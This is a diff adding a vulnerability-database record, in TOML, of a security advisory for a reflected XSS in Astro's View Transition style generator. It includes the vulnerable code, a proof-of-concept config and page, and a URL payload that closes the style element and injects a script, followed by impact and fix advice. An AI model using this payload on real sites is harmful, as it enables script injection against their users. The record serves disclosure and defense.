@@ -1,0 +1,139 @@
+[basic]
+description = '''
+## Summary
+
+Astro's server-side View Transition CSS generator interpolates animation properties into an inline `<style>` element without escaping them for the CSS and HTML contexts.
+
+An attacker-controlled value passed to an animation property such as `duration` can contain a `</style>` sequence, terminate the generated style element, and inject arbitrary HTML or JavaScript.
+
+This is similar to GHSA-8hv8-536x-4wqp, but exploits a different injection point: unescaped View Transition animation values in a server-generated `<style>` element rather than an unescaped slot name in a hydration template.
+
+Like GHSA-8hv8-536x-4wqp, exploitation requires an application to pass attacker-controlled data to an Astro API. However, the value is subsequently inserted into the HTML response without context-appropriate escaping by Astro.
+
+
+## Details
+
+
+`packages/astro/src/runtime/server/transition.ts`
+
+The generated stylesheet is wrapped in a `<style>` element and marked as HTML-safe:
+
+```ts
+const css = sheet.toString();
+result._metadata.extraHead.push(markHTMLString(`<style>${css}</style>`));
+```
+
+Animation properties are added to the stylesheet without escaping:
+
+```ts
+if (anim.duration) {
+  addAnimationProperty(builder, 'animation-duration', toTimeValue(anim.duration));
+}
+```
+
+For string values, `toTimeValue()` returns the input unchanged:
+
+```ts
+export function toTimeValue(num: number | string) {
+  return typeof num === 'number' ? num + 'ms' : num;
+}
+```
+
+As a result, a `duration` value containing `</style>` can escape from the generated style element.
+
+Other `TransitionAnimation` properties, including `easing`, `direction`, `delay`, `fillMode`, and `name`, are serialized by the same animation builder. The following PoC only relies on the official `fade()` helper and its `duration` option.
+
+
+## PoC
+
+Using:
+
+- `astro@7.0.9`
+- `@astrojs/node@11.0.2`
+
+### `astro.config.mjs`
+
+```js
+import node from '@astrojs/node';
+import { defineConfig } from 'astro/config';
+
+export default defineConfig({
+  output: 'server',
+  adapter: node({ mode: 'standalone' }),
+});
+```
+
+### `src/pages/index.astro`
+
+```astro
+---
+import { fade } from 'astro:transitions';
+
+const duration = Astro.url.searchParams.get('duration') ?? '300ms';
+---
+
+<html lang=\"en\">
+  <head>
+    <meta charset=\"utf-8\" />
+    <title>PoC</title>
+  </head>
+  <body>
+    <div transition:animate={fade({ duration })}>
+      Animated content
+    </div>
+  </body>
+</html>
+```
+
+### Payload:
+
+open:
+
+```text
+http://localhost:4321/?duration=%3C%2Fstyle%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C!--
+```
+
+The browser interprets `</style>` as the end of the generated style element and executes the injected script. An alert dialog is displayed when the page is opened.
+
+<img width=\"1307\" height=\"681\" alt=\"image\" src=\"https://github.com/user-attachments/assets/0834236d-008f-415f-9f23-db509ab6f8f6\" />
+
+## Impact
+
+An attacker who can control a View Transition animation value can execute arbitrary JavaScript in the origin of the affected Astro application.
+
+The query-based reflected XSS scenario affects on-demand/server-rendered routes, such as:
+
+- projects configured with `output: \"server\"`;
+- pages using `export const prerender = false`;
+- other server-side data flows that pass attacker-controlled values into a View Transition animation definition.
+
+Successful exploitation may allow access to sensitive page data and authenticated actions available to the victim.
+
+## Suggested Fix
+
+Animation values should be serialized using context-appropriate CSS escaping or validation before being added to the generated stylesheet.
+
+Additionally, content inserted into a raw `<style>` element must not be able to contain an HTML end-tag sequence such as `</style>`. The final generated CSS should be made safe for the HTML raw-text context before it is passed to `markHTMLString()`.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Astro: Reflected XSS via unescaped View Transition animation properties"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-4g3v-8h47-v7g6"]
+ave_id = "AVE-2026-1004"
+
+[meta]
+collected_at = "2026-08-05T18:52:46.026273047+00:00"
+status = "completed"
+
+[references]
+urls = []
